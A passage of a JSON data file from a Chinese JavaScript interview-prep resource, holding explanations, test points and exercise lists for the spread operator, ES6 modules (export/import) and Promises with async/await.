对象转成真正的数组，但是现在我们可以使用展开运算符完成这个任务：\n\n```auto\n[...document.querySelectorAll('div')]\n```\n\n你甚至可以从函数签名里得到数组形式的参数：\n\n```auto\nvar myFn = function(...args) {\n// ...\n}\n```\n\n`Array.from`也可以做同样的事情。\n\n## 使用 `Math`对象里的相关函数\n\n在参数个数不确定的函数里使用展开运算符，再合适不过了。\n\n```auto\nlet numbers = [9, 4, 7, 1];\nMath.min(...numbers); // 1\n```\n\n## 对象解构\n\n解构操作在变量批量赋值上非常方便，省去了繁琐的声明和赋值操作。配合使用展开运算符，进一步简化操作：\n\n```auto\nlet { x, y, ...z } = { x: 1, y: 2, a: 3, b: 4 };\nconsole.log(x); // 1\nconsole.log(y); // 2\nconsole.log(z); // { a: 3, b: 4 }\n```",
    "testPoint": "### **1. 展开运算符的基础概念**\n- **Spread Operator（展开运算符）**：用于展开数组或对象的元素。\n- **Rest Operator（剩余运算符）**：用于将多个参数收集成一个数组或对象。\n\n**考察点**：\n- 理解展开运算符的基本用法和区别。\n- 理解它在数组和对象中的不同用法。\n\n**示例问题**：\n- 请解释展开运算符的作用，并给出一个数组展开的例子。\n- 请解释 `...` 是如何在函数参数中作为剩余运算符工作的？\n\n### **2. 数组的展开（Spread）**\n展开运算符可以用来展开数组的元素，常见的应用场景有合并数组、复制数组等。\n\n**考察点**：\n- **合并数组**：如何使用展开运算符合并两个数组。\n- **复制数组**：如何使用展开运算符创建一个数组的浅拷贝。\n- **传递数组作为参数**：如何将数组展开为函数的独立参数。\n  \n**示例问题**：\n- 如何使用展开运算符将两个数组合并成一个新数组？请给出代码示例。\n- 如何用展开运算符创建一个数组的浅拷贝？\n\n### **3. 对象的展开（Spread）**\n在对象中，展开运算符可以用于复制对象，合并多个对象，或者在对象中更新特定字段。\n\n**考察点**：\n- **合并对象**：如何将多个对象合并为一个新对象。\n- **复制对象**：如何使用展开运算符创建对象的浅拷贝。\n- **对象更新**：如何在已有对象基础上更新某个字段（创建新对象并改变特定属性）。\n- **注意浅拷贝**：展开运算符只会进行浅拷贝，对象的嵌套属性还是会保持引用。\n\n**示例问题**：\n- 请用展开运算符实现两个对象的合并。\n- 用展开运算符创建一个对象的浅拷贝，并修改某个属性。\n\n### **4. 剩余运算符（Rest）**\n剩余运算符用于收集参数，通常用于函数参数中，收集不定数量的参数成一个数组。\n\n**考察点**：\n- **函数参数收集**：如何使用 `...` 作为函数参数收集多个参数。\n- **解构赋值**：如何使用 `...` 收集剩余属性（包括数组和对象的解构）。\n- **命名参数**：理解剩余运算符在函数参数中的位置（通常是最后一个参数）。\n\n**示例问题**：\n- 如何使用剩余运算符处理函数中不定数量的参数？\n- 在解构赋值中，如何使用剩余运算符来收集剩余的属性或数组元素？\n\n### **5. 数组和对象的解构赋值**\n展开运算符在解构赋值中也有重要应用，常常与剩余运算符结合使用，用来提取和分配剩余的元素或属性。\n\n**考察点**：\n- **数组解构**：如何使用展开运算符获取数组中的剩余元素。\n- **对象解构**：如何在对象解构中使用剩余运算符来获取剩余的属性。\n\n**示例问题**：\n- 如何使用展开运算符来解构一个数组并获取剩余元素？\n- 给定一个对象，如何通过解构和展开运算符获取剩余的属性？\n\n### **6. 展开运算符的浅拷贝**\n展开运算符在处理数组和对象时会创建浅拷贝，因此嵌套对象或数组的引用会被共享。\n\n**考察点**：\n- 理解浅拷贝和深拷贝的区别，知道展开运算符只进行浅拷贝。\n- 知道如何利用展开运算符进行对象和数组的浅拷贝，但也理解它的限制。\n\n**示例问题**：\n- 展开运算符在复制对象时会发生什么？它是如何进行浅拷贝的？\n- 使用展开运算符复制一个嵌套对象会出现什么问题？\n\n### **7. 展开运算符的性能**\n在大数据量或大量嵌套的情况下，展开运算符可能会影响性能，特别是在深拷贝和大量合并操作时。\n\n**考察点**：\n- 理解展开运算符对性能的影响，特别是在合并大量数据或进行深拷贝时。\n- 对比展开运算符和其他方法（如 `Object.assign`）的性能。\n\n**示例问题**：\n- 展开运算符在性能上有哪些潜在的陷阱？在处理大量数据时，有没有其他方法更合适？\n\n### **8. 展开运算符与 `Object.assign` 比较**\n`Object.assign` 和展开运算符都可以用于对象的合并和复制，但它们之间有一些细微的差异。\n\n**考察点**：\n- 理解 `Object.assign` 和展开运算符的异同，尤其是在合并对象时的行为差异。\n- 理解 `Object.assign` 是浅拷贝，而展开运算符在对象时行为类似。\n\n**示例问题**：\n- 展开运算符和 `Object.assign` 的主要区别是什么？你更倾向于使用哪一个？\n\n### **9. 展开运算符与数组函数的结合**\n展开运算符常常与数组方法（如 `concat`, `map`, `filter` 等）一起使用。\n\n**考察点**：\n- **使用与数组方法**：了解如何结合 `concat`, `map`, `filter` 等方法对数组进行操作。\n- **性能优化**：结合数组方法时，如何避免不必要的性能开销。\n\n**示例问题**：\n- 如何使用展开运算符和 `concat` 方法合并两个数组？\n- 在处理大型数组时，展开运算符如何影响性能？\n\n### **10. 展开运算符在函数参数中的应用**\n展开运算符可以用于将一个数组展开为函数的多个参数，或将多个参数收集到一个数组中。\n\n**考察点**：\n- **函数参数展开**：理解如何通过展开运算符将数组传递给函数，或者将多个参数聚合为一个数组。\n- **剩余参数**：理解如何使用剩余运算符来处理不定数量的参数。\n\n**示例问题**：\n- 请展示如何使用展开运算符将数组传递给函数。\n- 如何使用剩余运算符收集函数参数？",
    "exerciseKeyList": "[\"8244fd41-2b94-4179-887f-177501ddf280\",\"9cf9cb30-8864-4823-bf2d-d30b5f079f45\",\"593b09fd-094f-44b7-a375-6ddc393113a5\",\"4a0df14c-048b-47cc-a18f-1c9b36f54e90\"]",
    "vipLimit": 1,
    "level": 1,
    "pointOrder": 1,
    "createAt": "2024-10-02T14:25:00.000Z",
    "updateAt": "2025-01-03T02:23:04.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "4a0df14c-048b-47cc-a18f-1c9b36f54e90",
        "title": "ES6中数组新增了哪些扩展?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:35:15.000Z",
        "updateAt": "2024-07-22T15:41:11.000Z"
      },
      {
        "exerciseKey": "593b09fd-094f-44b7-a375-6ddc393113a5",
        "title": "ES6中对象新增了哪些扩展?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:35:38.000Z",
        "updateAt": "2024-07-20T09:42:53.000Z"
      },
      {
        "exerciseKey": "8244fd41-2b94-4179-887f-177501ddf280",
        "title": "object.assign和扩展运算法是深拷贝还是浅拷贝，两者区别是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-22T10:20:08.000Z",
        "updateAt": "2024-07-20T11:57:26.000Z"
      },
      {
        "exerciseKey": "9cf9cb30-8864-4823-bf2d-d30b5f079f45",
        "title": "ES6中函数新增了哪些扩展?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:36:00.000Z",
        "updateAt": "2024-07-20T09:43:44.000Z"
      }
    ]
  },
  "53": {
    "id": 53,
    "tagId": 24,
    "title": "export/import ",
    "explanation": "export，import 是什么\n----------------------\n\n我们知道，JS 模块导入导出，使用 `import` , `export` 这两个关键字\n\n*   **export** 用于对外输出本模块\n*   **import** 用于导入模块\n\n> 也就是说使用 export 导出一个模块之后，其它文件就可以使用 import 导入相应的模块了\n\n下面我们具体看看， import 和 export 到底怎么用？怎么导出模块（比如变量，函数，类，对象等）\n\n### 1 导出单个变量\n\n```js\n//a.js 导出一个变量，语法如下\nexport var site = \"www.helloworld.net\"\n\n//b.js 中使用import 导入上面的变量\nimport { site } from \"/.a.js\" //路径根据你的实际情况填写\nconsole.log(site)\t//输出： www.helloworld.net\n\n```\n\n### 2 导出多个变量\n\n上面的例子是导出单个变量，那么如何导出多个变量呢\n\n````js\n //a.js 中定义两个变量，并导出\n var siteUrl=\"www.helloworld.net\"\n var siteName=\"helloworld开发者社区\"\n \n //将上面的变量导出\n export { siteUrl ,siteName }  \n \n \n \n // b.js 中使用这两个变量\n import { siteUrl , siteName } from \"/.a.js\" //路径根据你的实际情况填写\n\n console.log(siteUrl)\t//输出： www.helloworld.net\n console.log(siteName)\t//输出： helloworld开发者社区\n\n\n```\n\n### 3 导出函数\n\n导出函数和导出变量一样，需要添加`{ }`\n\n````js\n//a.js 中定义并导出一个函数\nfunction sum(a, b) {\n    return a + b\n}\n//将函数sum导出\nexport { sum } \n\n//b.js 中导入函数并使用\nimport { sum } from \"/.a.js\" //路径根据你的实际情况填写\nconsole.log( sum(4,6) ) //输出： 10\n\n```\n\n### 4 导出对象\n\njs中一切皆对象，所以对象一定是可以导出的，并且有两种写法\n\n#### 4.1 第一种写法\n\n使用 `export default` 关键字导出，如下\n\n````js\n//a.js 中，定义对象并导出, 注意，使用export default 这两个关键字导出一个对象\nexport default {\n    siteUrl:'www.helloworld.net',\n    siteName:'helloworld开发者社区'\n}\n\n//b.js 中导入并使用\nimport obj from './a.js'   \t//路径根据你的实际情况填写\nconsole.log(obj.siteUrl)\t//输出：www.helloworld.net\nconsole.log(obj.siteName)\t//输出：helloworld开发者社区\n\n```\n\n#### 4.2 第二种写法\n\n同样是使用`export default` 关键字，如下\n\n````js\n//a.js 中定义对象，并在最后导出\nvar obj = {\n   \tsiteUrl:'www.helloworld.net',\n    siteName:'helloworld开发者社区'\n}\n\nexport default obj\t//导出对象obj\n\n//b.js 中导入并使用\nimport obj from './a.js'   \t//路径根据你的实际情况填写\nconsole.log(obj.siteUrl)\t//输出：www.helloworld.net\nconsole.log(obj.siteName)\t//输出：helloworld开发者社区\n\n\n```\n\n### 5 导出类\n\n导出类与上面的导出对象类似，同样是用 `export default` 关键字，同样有两种写法\n\n#### 5.1 第一种写法\n\n````js\n//a.js 中定义一个类并直接导出\nexport default class Person {\n    //类的属性\n    site = \"www.helloworld.net\"\n\n    //类的方法\n    show(){\n        console.log(this.site)\n    }\n}\n\n//b.js 中导入并使用\n//导入类\nimport Person from './a.js'\n\n//创建类的一个对象person\nlet person = new Person()\n\n//调用类的方法\nperson.show()  \t//输出：www.helloworld.net\n\n\n```\n\n#### 5.2 第二种写法\n\n````js\n//a.js 中定义一个类，最后导出\nclass Person {\n    //类的属性\n    site = \"www.helloworld.net\"\n\n    //类的方法\n    show(){\n        console.log(this.site)\n    }\n}\n\n//导出这个类\nexport default Person \n\n//b.js 中导入并使用\n//导入类\nimport Person from './a.js'\n\n//创建类的一个对象person\nlet person = new Person()\n\n//调用类的方法\nperson.show()  \t//输出：www.helloworld.net\n\n\n```\n\n### 小结\n\n下面我们简单总结一下\n\n`export`与`export default`的区别\n\n*   export与export default均可用于导出常量、函数、文件、模块等\n*   可以在其它文件或模块中通过import+(常量 | 函数 | 文件 | 模块)名的方式，将其导入，以便能够对其进行使用\n*   export default后面不能跟const或let的关键词\n*   export、import可以有多个，export default仅有一个。\n*   通过export方式导出，在导入时要加 { }，export default则不需要\n*   export具名导出xxx ，export default匿名。区别在于导入的时候，export需要一样的名称才能匹配，后者无论取什么名都可以。\n*   模块化管理中一个文件就是一个模块，export可以导出多个方法和变量，export default只能导出当前模块，一个js文件中只支持出现一个\n\n对于 `import` ,`export` , `export default` ，他们的用法上面的例子已经很详细的列出了，忘记的时候，可以当作参考看看\n\n最重要的还是要明白为什么要这么写，实在不明白记住就行了。\n\n  \n\n",
    "testPoint": "### **1. `export` 的基本使用**\n`export` 用于导出模块中的内容（如变量、函数、类等），使得其他模块能够导入这些内容。\n\n**考察点**：\n- **命名导出（Named Export）**：通过 `export` 导出多个内容，可以选择性地导入它们。\n- **默认导出（Default Export）**：通过 `export default` 导出一个单一内容，可以通过自定义的名称导入。\n\n**示例问题**：\n- 什么是命名导出？请举个例子。\n- 什么是默认导出？请举个例子，并解释两者的区别。\n\n**代码示例**：\n```javascript\n// 命名导出\nexport const name = 'John';\nexport function greet() { return 'Hello!'; }\n\n// 默认导出\nexport default function() { return 'I am a default exported function'; }\n```\n\n---\n\n### **2. `import` 的基本使用**\n`import` 用于从其他模块导入内容。可以导入命名导出或默认导出。\n\n**考察点**：\n- **导入命名导出**：使用 `{}` 来导入模块中命名的内容。\n- **导入默认导出**：直接使用自定义名称导入默认导出的内容。\n- **导入整个模块**：使用 `* as` 导入整个模块，通常用于导入包含多个导出的模块。\n  \n**示例问题**：\n- 如何导入命名导出和默认导出？请举例说明。\n- 如何导入一个模块的所有导出？给出一个例子。\n\n**代码示例**：\n```javascript\n// 导入命名导出\nimport { name, greet } from './module';\n\n// 导入默认导出\nimport greetFn from './greetFunction';\n\n// 导入整个模块\nimport * as utils from './utils';\n```\n\n---\n\n### **3. 默认导出与命名导出的区别**\n候选人需要理解命名导出与默认导出的主要区别，尤其是在导入时的语法差异。\n\n**考察点**：\n- **命名导出**：模块可以有多个命名导出，通过 `{}` 导入，需要完全匹配导出的名字。\n- **默认导出**：模块只有一个默认导出，可以导入时自定义名称。\n\n**示例问题**：\n- `export` 和 `export default` 有什么区别？哪个场景下使用它们更合适？\n\n**代码示例**：\n```javascript\n// 文件: person.js\n// 命名导出\nexport const name = 'Alice';\n// 默认导出\nexport default { name: 'Bob' };\n\n// 文件: app.js\nimport { name } from './person';  // 导入命名导出\nimport person from './person';     // 导入默认导出\n```\n\n---\n\n### **4. 导入和导出时的重命名**\n`import` 和 `export` 都允许在导入或导出时进行重命名，以避免命名冲突或为了方便使用。\n\n**考察点**：\n- **导出时重命名**：使用 `as` 进行重命名。\n- **导入时重命名**：也可以使用 `as` 进行重命名。\n\n**示例问题**：\n- 如何导入一个命名导出并重命名？请举个例子。\n- 如何在导出时进行重命名？\n\n**代码示例**：\n```javascript\n// 重命名导出\nconst age = 30;\nexport { age as userAge };\n\n// 重命名导入\nimport { userAge as age } from './person';\n```\n\n---\n\n### **5. 动态导入（Dynamic Import）**\nES6 支持动态导入，它允许在运行时按需加载模块，而不是在页面加载时一次性加载所有模块。\n\n**考察点**：\n- **基本概念**：理解 `import()` 的语法和用法。\n- **异步加载模块**：动态导入会返回一个 `Promise`，因此可以与 `async/await` 结合使用。\n\n**示例问题**：\n- 什么是动态导入？请展示如何使用 `import()` 来动态导入一个模块。\n- 动态导入与静态导入的主要区别是什么？\n\n**代码示例**：\n```javascript\n// 动态导入\nasync function loadModule() {\n  const module = await import('./module.js');\n  console.log(module);\n}\n```\n\n---\n\n### **6. 循环依赖问题**\nES6 模块化在处理模块间循环依赖时有其特性，候选人需要理解如何处理和避免循环依赖。\n\n**考察点**：\n- **循环依赖的处理**：ES6 模块会在解析时返回一个部分解析的对象，因此可以避免死锁或无限循环的问题。\n- **理解导入时的行为**：了解模块在被导入时，未完全解析的部分会被返回，避免出现空对象或错误。\n\n**示例问题**：\n- 什么是循环依赖，如何避免在 ES6 模块中出现循环依赖？\n\n---\n\n### **7. 模块的静态分析**\nES6 模块是静态的，这意味着编译时可以确定模块的依赖关系，这对工具（如打包工具）有重要意义。\n\n**考察点**：\n- **静态依赖**：模块导入在编译时就已经明确，因此不可以在条件语句中动态地改变导入。\n- **编译期的优化**：如何利用这一特点优化构建和打包过程。\n\n**示例问题**：\n- ES6 模块和 CommonJS 模块在导入时有什么区别？\n- 为什么 ES6 模块是静态的？它对构建工具（如 Webpack）的优化有何意义？\n\n---\n\n### **8. 默认导出与命名导出混用**\n可以在同一个模块中同时使用默认导出和命名导出，但两者的使用方式和适用场景需要理解。\n\n**考察点**：\n- **同时使用**：如何在一个模块中同时使用默认导出和命名导出，并理解使用场景。\n- **导入时的区别**：如何导入默认导出和命名导出的内容。\n\n**示例问题**：\n- 一个模块中同时使用默认导出和命名导出时，如何正确导入它们？\n\n**代码示例**：\n```javascript\n// 模块中同时使用默认导出和命名导出\nexport const foo = () => {};\nexport default function() {};\n\n// 导入时\nimport myFunc, { foo } from './module';\n```\n\n---\n\n### **9. 模块的缓存机制**\nES6 模块有缓存机制，即同一个模块在同一运行时只会被加载一次，之后的导入都从缓存中获取模块内容。\n\n**考察点**：\n- **模块缓存**：理解模块是如何被缓存的，尤其是在多次导入同一个模块时。\n- **如何避免缓存带来的问题**：理解模块缓存的副作用，特别是在需要重新加载模块时。\n\n**示例问题**：\n- ES6 模块导入时的缓存机制是怎样的？如何处理缓存问题？\n\n---\n\n### **10. 模块导入和打包工具的集成**\n了解 ES6 模块在现代构建工具（如 Webpack、Rollup）中的使用，尤其是如何通过 Tree Shaking 等技术优化最终的打包结果。\n\n**考察点**：\n- **Tree Shaking**：如何通过打包工具优化模块，只打包实际使用的模块。\n- **模块按需加载**：如何通过 ES6 模块进行懒加载和优化构建过程。\n\n**示例问题**：\n- 解释 Tree Shaking 是如何工作的，如何与 ES6 模块配合使用？",
    "exerciseKeyList": "[\"bfffc416-1177-4c3c-bf93-622185a72fda\",\"8ecafda7-0ae6-40bd-b8c6-385d02fa7165\",\"f5f2f81e-c0c8-409e-ba00-3f3428ae535b\",\"7cdbad60-69cf-4534-aac1-2413f9fe77a1\"]",
    "vipLimit": 1,
    "level": 1,
    "pointOrder": 1,
    "createAt": "2024-10-02T14:31:08.000Z",
    "updateAt": "2025-01-07T12:18:40.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "7cdbad60-69cf-4534-aac1-2413f9fe77a1",
        "title": "如何理解 ES6 模块化方案的缓存机制？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2025-01-07T12:18:16.000Z",
        "updateAt": "2025-01-07T12:18:21.000Z"
      },
      {
        "exerciseKey": "8ecafda7-0ae6-40bd-b8c6-385d02fa7165",
        "title": "说说你对JS的模块化方案的了解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-07-03T05:30:11.000Z",
        "updateAt": "2024-08-10T17:06:47.000Z"
      },
      {
        "exerciseKey": "bfffc416-1177-4c3c-bf93-622185a72fda",
        "title": "直接在script标签中写 export 为什么会报错？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-12-26T03:36:38.000Z",
        "updateAt": "2021-12-26T16:05:31.000Z"
      },
      {
        "exerciseKey": "f5f2f81e-c0c8-409e-ba00-3f3428ae535b",
        "title": "说说你对模块化方案的理解，比如 CommonJS、AMD、CMD、ES Module 分别是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-10-10T12:42:00.000Z",
        "updateAt": "2024-08-10T17:07:03.000Z"
      }
    ]
  },
  "54": {
    "id": 54,
    "tagId": 24,
    "title": "Promise",
    "explanation": "Promise 是在 ES6 出现的新功能，并且是用来优化过去回调函式 callback 的写法。这篇面试详解中会讨论到， promise 是什么、为什么需要有 Promise，以及延伸到 async/await 相关问题。\n\n为什么要使用 Promise？\n---------------\n\n在探讨 Promise 之前，我们先来看一下为什么需要它的出现。\n\nJavaScript 中有一个重要概念 - 异步 (async)，它允许我们在执行耗时任务时，不必等待程式完成，而是继续执行下面的代码，直到任务完成再通知。常用的异步操作有：文件操作、数据库操作、AJAX 以及定时器等。\n\nJavaScript 有两种实现异步的方式：\n\n**第一种：回调函式 callback function**\n\n在 ES6 promise 出现之前，通常使用回调函式 (callback) 实现异步操作。但使用回调函式 callback 存在一个明显的缺点，当需要执行多个异步操作时，代码会不断往内嵌套，这种情况通常被称为「callback 地狱」(callback hell)。\n\n```js\ncallback(() => {\n  console.log(\"Hello!\");\n  callback(() => {\n    console.log(\"Hello!\");\n    callback(() => {\n      console.log(\"Hello!\");\n      callback(() => {\n        console.log(\"Hello!\");\n      }, 200);\n    }, 200);\n  }, 200);\n}, 200);\n\n```\n\n而为了解决这种问题，就出现了第二种方法 - promise。\n\n什么是 Promise？\n------------\n\n上一段提到 Promise 出现的原因，这一段我们来看那到底 Promise 是什么。\n\nPromise 照英文上的意思，是约定、承诺，它代表的意涵是这个约定请求会在未来每个时刻返回数据给调用者。在 MDN 文件中， Promise 是用来表示**一个异步操作的最终完成（或失败）及其结果值**。\n\n### 怎么使用 Promise\n\nPromise 是一个**构造函式**，我们需要透过 new 关键字建立一个 Promise。而 Promise 会接收一个函式作为参数，这个函式又称为 executor，executor 会立即执行。如下方代码，若丢入浏览器开发者工具执行，console 的结果会立刻被打印出来。\n\n```js\nnew Promise((resolve, reject) => {\n  console.log(\"executor 立即执行\"); // executor 立即执行\n});\n```\n\n而 executor 函式，会再接受另外两个函式参数\n\n*   resolve 实现函式：如下方代码，请求成功的例子，正确的时候会调用 resolve 函式，并回传结果。\n*   reject 拒绝函式：如下方代码，请求失败的例子，失败的时候会调用 reject 函式，并回传结果。\n\n```js\nfunction requestData(url) {\n  return new Promise((resolve, reject) => {\n    setTimeout(() => {\n      if (url === \"explainthis.io\") {\n        resolve(\"hello welcome to explainthis\");\n      } else {\n        reject(\"it is not explainthis\");\n      }\n    }, 3000);\n  });\n}\n// 1. 请求成功\nrequestData(\"explainthis.io\").then((res) => {\n  console.log(res); //hello welcome to explainthis\n});\n//2. 请求失败\nrequestData(\"explainthis.com\").catch((e) => console.log(e)); //it is not explainthis\n\n```\n\n### Promise 的状态\n\n一个 Promise 一定会处于以下三种状态的其中一种\n\n1.  pending：初始状态，执行了 executor，但还在等待中。\n2.  fulfilled：表示操作完成，执行 resolve 函式。\n3.  rejected：表示操作失败，执行 reject 函式。\n\n### `then` 的使用\n\n1.  多次调用\n\n延续前段谈到的，异步用第一种 callback 做法很容易有 callback hell 的产生，而使用 Promise 的好处则可以避免这种难以阅读的写法。\n\nPromise 可以用一种链式 (chaining) 的方式将这些异步操作串连，如下方代码范例，我们可以透过 then 来将等完成之后的操作串起。\n\n```js\nfunction requestData(url) {\n  return new Promise((resolve, reject) => {\n    setTimeout(() => {\n      if (url === \"explainthis.io\") {\n        resolve(\"hello welcome to explainthis\");\n      } else {\n        reject(\"it is not explainthis\");\n      }\n    }, 3000);\n  });\n}\nrequestData(\"explainthis.io\")\n  .then((res) => {\n    console.log(res); //hello welcome to explainthis\n    return 1;\n  })\n  .then((res) => {\n    console.log(res); // 1\n    return 2; //hello welcome to explainthis\n  })\n  .then((res) => {\n    console.log(res); // 2\n  });\n\n```\n\n1.  then 方法可以接受两个参数，一个为成功的回调，另一个为失败的回调\n\n```js\nfunction requestData(url) {\n  return new Promise((resolve, reject) => {\n    setTimeout(() => {\n      if (url === \"explainthis.io\") {\n        resolve(\"hello welcome to explainthis\");\n      } else {\n        reject(\"it is not explainthis\");\n      }\n    }, 0);\n  });\n}\nrequestData(\"explainthis.com\").then(\n  (res) => {\n    console.log(res);\n  },\n  (reason) => {\n    console.log(reason);\n  }\n);\n//it is not explainthis\n\n```\n\n### 错误处理\n\nPromise 的一个好处是错误处理，最简单的方式是在加上一个 catch 来捕捉错误，并执行一些错误处理代码。如下方代码，如果请求失败，例如由于网络故障，则 Promise 会被拒绝。在这种情况下，catch 方法将捕获错误，并输出错误讯息。\n\n```js\nfetch(\"https://explainthis.com/data\")\n  .then((response) => response.json())\n  .then((data) => {\n    console.log(data);\n  })\n  .catch((error) => {\n    console.error(\"oops!\", error);\n  })\n  .finally(() => {\n    console.log(\"close loader\");\n  });\n\n```\n\n### `finally` 方法\n\n如果有加上 `finally`，那 Promise 状态不论是 fulfilled 还是 rejected 都会需要执行 `finally` 方法。 `finally` 是 Promise 处理流程中一个非常有用的方法，它可以帮助我们在不管 Promise 是否成功的状态下，执行一定必要的操作。\n\n使用情境例如，一进入页面要先从服务器 fetch 资料，等待的同时会显示 loading 的画面，而最后不论是否有拿到资料，我们都需要把 loader 关闭。这时候，关闭 loader 的逻辑，就很适合放在 finally 中。如下方代码：\n\n```js\nfetch(\"https://explainthis.com/data\")\n  .then((response) => response.json())\n  .then((data) => {\n    console.log(data);\n  })\n  .catch((error) => {\n    console.error(error);\n  })\n  .finally(() => {\n    console.log(\"close loader\");\n  });\n\n```\n\n什么是 async/await？\n----------------\n\nasync/await 是一种基于 Promise 之上的语法糖，比 Promise 的写法更像是同步操作。\n\n首先，我们会使用 async 关键字将函式标记为异步函式，异步函式就是指返回值为 Promise 物件的函式。\n\n在异步函式中我们可以调用其他的异步函式，不过不是使用 then()，而是使用 await 语法，await 会等待 Promise 完成之后直接返回最终的结果。\n\n```js\nasync function getData() {\n  const res = await fetch(\"https://getsomedata\");\n  const data = await res.json();\n  console.log(data);\n}\ngetData();\n\n```\n\n",
    "testPoint": "\n### 一、Promise的基本概念与状态\n\n1. **定义与用途**：\n   - Promise是什么？它解决了什么问题？\n   - Promise在异步编程中的作用和重要性。\n\n2. **状态管理**：\n   - Promise的三种状态（Pending、Fulfilled、Rejected）及其含义。\n   - 状态转换的规则：状态只能从Pending变为Fulfilled或Rejected，且一旦转变就不可再更改。\n\n### 二、Promise的API及其使用\n\n1. **构造函数**：\n   - Promise构造函数的参数和执行器函数的作用。\n   - 如何使用resolve和reject函数来改变Promise的状态。\n\n2. **链式调用**：\n   - `.then()`方法的使用：成功回调和失败回调的指定。\n   - `.catch()`方法的使用：专门用于处理Promise被拒绝的情况。\n   - `.finally()`方法（如果面试官提及）：无论Promise成功还是失败，都会执行的回调。\n\n3. **静态方法**：\n   - `Promise.all()`：用于并行执行多个Promise，并等待它们全部完成。\n   - `Promise.race()`：用于并行执行多个Promise，并返回第一个完成的Promise的结果。\n   - `Promise.allSettled()`：等待所有给定的Promise都成功或失败，并返回一个包含每个Promise结果的对象数组。\n   - `Promise.any()`：只要有一个Promise成功，就返回那个已经成功的Promise的结果。\n   - `Promise.resolve()`和`Promise.reject()`：快速创建已解决或已拒绝的Promise。\n\n### 三、Promise的错误处理与异常捕获\n\n1. **错误传播**：\n   - 在Promise链中，如果一个`.then()`或`.catch()`中的回调函数抛出错误或返回一个被拒绝的Promise，这个错误会传播到下一个`.catch()`中。\n\n2. **异常捕获**：\n   - 使用`.catch()`方法来捕获Promise链中的错误。\n   - 如何在异步操作中正确地捕获和处理异常。\n\n### 四、Promise的实践应用与常见问题\n\n1. **避免回调地狱**：\n   - 通过Promise的链式调用来避免回调函数嵌套过深导致的回调地狱问题。\n\n2. **并行与串行执行**：\n   - 如何使用Promise来并行或串行执行多个异步操作。\n\n3. **资源管理与清理**：\n   - 在Promise链中，如何确保在异步操作完成后正确地释放资源或进行清理工作。\n\n4. **Promise与async/await的关系**：\n   - async/await是基于Promise的语法糖，它使得异步代码看起来更像是同步代码。\n   - 如何将Promise转换为async/await风格，并理解其背后的原理。\n\n### 五、手写Promise的实现（高级考点）\n\n1. **实现原理**：\n   - 理解Promise的内部工作原理，包括状态管理、回调函数的存储与调用等。\n\n2. **代码实现**：\n   - 手写一个简单的Promise实现，包括构造函数、`.then()`、`.catch()`等方法的实现。\n",
    "exerciseKeyList": "[\"ee457290-82ef-4c2b-b2f1-e6b1b28e9166\",\"fbcd6444-9c0f-492a-b138-bd205bb4bf1d\",\"aaee81ad-a128-4bbf-b60b-aa2c9c3396c3\",\"47240d74-7170-41b6-b85d-2a6977ea9a11\",\"f1dfb420-8c92-4210-98af-130b79133d82\",\"f8787bfb-ca4c-4b0f-98d9-4ad5e0a3774d\",\"34d5eef9-20cb-4aac-b34b-87ab513456a7\",\"d0fd3a52-1ddf-42b2-b9d8-f36fc885d237\",\"a0a7f06f-8aa3-4408-8a40-87c33bd3608f\",\"13146206-837d-4eb6-9d47-c7152c4dae46\",\"c5f7ff93-7de3-4ebd-bfaa-bcaeebcd7f56\",\"1bdd3e29-f9b2-4f1d-a8b2-6a8b14320779\",\"848cb975-f2e8-4a46-bf55-d36acd6a1a38\",\"5426fc5b-0f7d-4095-98bf-f76016ca090e\",\"7b82de7c-5c47-4e5a-9630-df2721d17edb\",\"8169e336-3daa-4e6c-9f85-13c4a9a31467\",\"f355de02-e03c-4d97-ac11-cd1de62867ab\",\"3526fff1-d92d-4568-b6dd-549bc6c2a92e\",\"d4b6e13e-5036-4231-bf64-dae0fd27b849\",\"3925cf74-ee93-49fd-8896-8bc7221f32a4\",\"462ff8a8-29ba-4e49-88ad-d60e7b3f4ee8\",\"584f7b53-5e4b-48b9-ad7b-ae4789647ada\",\"9f0dbfc0-bd61-4956-8093-d604ac401983\",\"446d36f9-0845-432d-957a-7a9a2997a276\",\"dec780c4-3610-4673-b12f-add388ceec10\",\"41c2b7e0-3ab2-4a94-8017-1804b0ddf868\",\"570eed0a-2340-4c59-a6c0-967db6a7dc48\",\"59b71384-0a0a-4d2e-a63a-f4fb75650b60\",\"32b06302-58e6-44df-acb7-6c975dcc2957\",\"26bf47fe-07e4-4014-b3ea-8a745f70d718\",\"7fdc5ee0-1c5f-483b-927b-140536ea83f2\",\"a1902422-cbf4-4551-9f88-891eb1777e8d\",\"52ba6f44-41dd-44cb-a2f4-2dc1589fb02b\",\"ced16bc7-215d-47a2-9bef-7e6ab67f303c\",\"2c14e603-0e2b-4a05-89b7-d5c45804527a\",\"96feb2bc-cdd7-4b16-be8a-e9d5af64a27b\",\"2b7bc012-86d2-405a-8a26-778f5f1b6dfe\",\"44b5f8c5-1d8c-4294-b668-7f7f096cd44c\",\"613e333e-ffca-45ff-a13a-debd8053d913\",\"3489b960-4172-47f8-9ae2-93616d85009f\",\"fa9e9946-de5b-4998-a224-8d512d3ccac2\",\"e233c823-d125-4abe-b1da-878751a92cd9\",\"9656ede7-6815-4a00-9df3-60c0219e4383\",\"023f27d0-f90b-446d-bd6c-293e95f9c9b8\",\"7a27cdc8-5f66-4cea-8350-c20d0bd2836b\",\"090868ab-fef9-4759-8b81-20708a165fa1\",\"e0e3dbcd-2e8a-4756-9241-bbb23af9c2e8\",\"30dd1b36-496d-4a65-a3e7-75be59b36570\",\"58350841-57d6-4b0a-9e31-57f5f0e16357\",\"1b41e9cc-194a-4e0c-8bc5-17a83af9abad\",\"31621982-633a-4254-a1a4-b518f734c674\",\"f6f14b00-ae3f-43a9-9085-12333dd0cb8c\",\"37a4ad10-3819-4ab3-bb5f-26a6bf1ca07a\",\"d9a36bb7-972c-4afb-abb6-fcbaa30612cf\",\"fa6c1